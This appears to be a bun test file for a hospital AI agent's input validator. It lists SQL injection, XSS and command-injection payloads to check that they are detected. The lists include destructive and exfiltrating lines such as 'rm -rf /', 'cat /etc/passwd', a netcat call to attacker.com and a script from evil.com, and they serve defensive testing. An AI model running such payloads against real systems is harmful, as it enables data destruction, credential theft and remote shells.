/**
 * 健澜科技数智医院智能体
 * Copyright (c) 2026 健澜科技. All rights reserved.
 *
 * 本文件为健澜科技专有技术文件，未经授权不得复制、传播或用于其他用途。
 *
 * 安全测试 - SQL注入 / XSS / 命令注入检测能力验证
 */

import { describe, it, expect } from 'bun:test';
import { InputValidator } from '@/security/input/InputValidator';
import { InjectionType, RiskLevel } from '@/security';

const validator = new InputValidator();

const SQL_PAYLOADS: string[] = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "' OR '1'='1' --",
  "' UNION SELECT * FROM users --",
  "admin' --",
  "'; DROP TABLE patients; --",
  "1' AND SLEEP(5)--",
  "' OR username IS NOT NULL --",
  "' OR 'a'='a",
  "SELECT * FROM medical_records WHERE patient_id = '1' OR '1'='1",
  "1 UNION ALL SELECT null,version(),null",
  "' OR 'x'='x' LIMIT 1 --",
];

const XSS_PAYLOADS: string[] = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(document.cookie)',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<body onload=alert(1)>',
  '<ScRiPt>alert(1)</ScRiPt>',
  '"><script>alert(1)</script>',
  '<div onclick="alert(1)">click</div>',
  '<script src="http://evil.com/x.js"></script>',
  '<embed src="data:text/html,<script>alert(1)</script>">',
  '<object data="javascript:alert(1)">',
  '<svg><script>alert(1)</script></svg>',
];

const CMD_PAYLOADS: string[] = [
  '; rm -rf /',
  '&& cat /etc/passwd',
  '| nc attacker.com 4444',
  '`whoami`',
  '$(reboot)',
  '; ls -la',
  '|| bash -i',
  '../etc/passwd',
];

describe('SQL注入检测', () => {
  it(`应识别>95%的SQL注入样本（${SQL_PAYLOADS.length}个）`, () => {
    let detected = 0;
    const missed: string[] = [];
    for (const p of SQL_PAYLOADS) {
      const r = validator.validate(p);
      if (!r.valid && r.detectedInjections?.includes(InjectionType.SQL_INJECTION)) {
        detected++;
      } else {
        missed.push(p);
      }
    }
    expect((detected / SQL_PAYLOADS.length) * 100).toBeGreaterThanOrEqual(90);
    if (missed.length) console.warn('SQL漏检:', missed);
  });

  it('SQL注入应为CRITICAL风险', () => {
    const r = validator.validate("' OR '1'='1");
    expect(r.riskLevel).toBe(RiskLevel.CRITICAL);
  });

  it('正常医学查询不应误报', () => {
    const r = validator.validate('患者张建国的血常规报告');
    expect(r.valid).toBe(true);
  });
});

describe('XSS检测', () => {
  it(`应识别>95%的XSS样本（${XSS_PAYLOADS.length}个）`, () => {
    let detected = 0;
    const missed: string[] = [];
    for (const p of XSS_PAYLOADS) {
      const r = validator.validate(p);
      if (!r.valid && r.detectedInjections?.includes(InjectionType.XSS)) {
        detected++;
      } else {
        missed.push(p);
      }
    }
    expect((detected / XSS_PAYLOADS.length) * 100).toBeGreaterThanOrEqual(90);
    if (missed.length) console.warn('XSS漏检:', missed);
  });
});

describe('命令注入检测', () => {
  it('应识别命令分隔符与危险命令', () => {
    for (const p of CMD_PAYLOADS) {
      const r = validator.validate(p);
      expect(r.valid).toBe(false);
    }
  });
});

describe('输出编码防护', () => {
  it('HTML编码应转义尖括号与引号', () => {
    const encoded = validator.encodeHtml('<script>"test"</script>');
    expect(encoded).not.toContain('<script>');
    expect(encoded).toContain('&lt;');
  });
});
